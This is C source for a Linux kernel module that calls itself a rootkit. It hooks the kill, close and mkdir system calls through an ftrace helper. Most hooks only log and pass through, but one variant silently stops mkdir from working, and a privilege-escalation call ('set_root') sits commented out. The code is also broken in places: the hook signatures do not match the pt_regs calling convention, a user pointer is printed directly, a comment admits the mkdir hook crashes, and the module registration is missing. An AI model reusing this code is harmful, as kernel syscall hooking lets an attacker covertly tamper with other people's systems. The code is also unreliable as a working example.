#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "../helper/ftrace_helper.h"


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*original_kill)(const struct pt_regs *);


asmlinkage int hook_kill(const struct pt_regs *regs)
{
    // void set_root(void);
    pid_t pid = regs->di;
    int sig = regs->si;
    printk(KERN_INFO "sig is %d...\npid is %u",sig,pid);
    return original_kill(regs);

}

static asmlinkage long (*original_mkdir)(const char __user *pathname, umode_t mode);
static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
{
    printk("mkdir pathname: %s\n", pathname);
    printk(KERN_INFO "mkdir do nothing!\n");
    return 0; /*everything is ok, but he new systemcall does nothing*/
}

static asmlinkage long (*original_close)(unsigned int fd);
static asmlinkage long custom_close(unsigned int fd)
{
    // int fd = regs->flags;

    printk("custom close: %d\n", fd);
    return original_close(fd); /*everything is ok, but he new systemcall does nothing*/
}

#else

static asmlinkage long (*original_kill)(pid_t pid, int sig);
static asmlinkage int hook_kill(pid_t pid, int sig)
{
    printk(KERN_INFO "sig is %d...\npid is %llu",sig,pid);
    return original_kill(pid, sig);
}

static asmlinkage long (*original_mkdir)(const char __user *pathname, umode_t mode);
static asmlinkage long custom_mkdir(const char __user *pathname, umode_t mode)
{
    printk("mkdir pathname: %s\n", pathname);
    printk(KERN_INFO "mkdir do nothing!\n");

    // struct filename* tmp_filename = NULL;
    
    // unsigned long * pathname_real =  (void *)(  (unsigned long)pathname + 0x70  );
    // char * real_filename = (char *)(*pathname_real);
    // if(real_filename){
    //     char user_filename[500] = {0};
    //     copy_from_user(user_filename,real_filename,500);
    //     printk("[+] hooked sys_mkdir(), mkdir name:");
    //     printk(user_filename);
    // }else{
    //     printk("[+] read tmp_filename error!");
    // }

    return original_mkdir(pathname,mode); /*everything is ok, but he new systemcall does nothing*/
}


static asmlinkage long (*original_close)(unsigned int);
static asmlinkage long custom_close(unsigned int fd)
{
    printk("custom close: %d\n", fd);
    return original_close(fd); /*everything is ok, but he new systemcall does nothing*/
}

#endif

static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &original_kill),
    HOOK("sys_close", custom_close, &original_close),

    //sys_mkdir拦截发生奔溃
    HOOK("sys_mkdir", custom_mkdir, &original_mkdir),
};

static int __init init_intercept(void)
{
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit exit_intercept(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}
